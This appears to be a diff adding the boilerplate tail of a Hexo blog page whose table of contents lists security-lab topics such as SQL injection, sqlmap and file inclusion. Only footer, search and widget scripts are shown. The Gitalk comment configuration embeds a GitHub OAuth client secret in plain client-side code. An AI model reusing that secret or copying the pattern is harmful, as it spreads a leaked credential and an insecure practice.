class="nav-text">SQL注入漏洞—low</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">3.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">4.</span> <span class="nav-text">文件包含漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div class="footer-custom">Welcome to my <a target="_blank" href="https://github.com/gaoteng17">GitHub Page</a></div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+   
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID:  '96531982aa814e82e033', 
+          clientSecret: '9d64fd0a7523408d110bfc9839658aaa2a0ee62e',
+          id: window.location.pathname,
+          repo: 'Blog_Comments', 
+          owner: 'gaoteng17', 
+          admin: 'gaoteng17', 
+          distractionFreeMode: 'true',
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
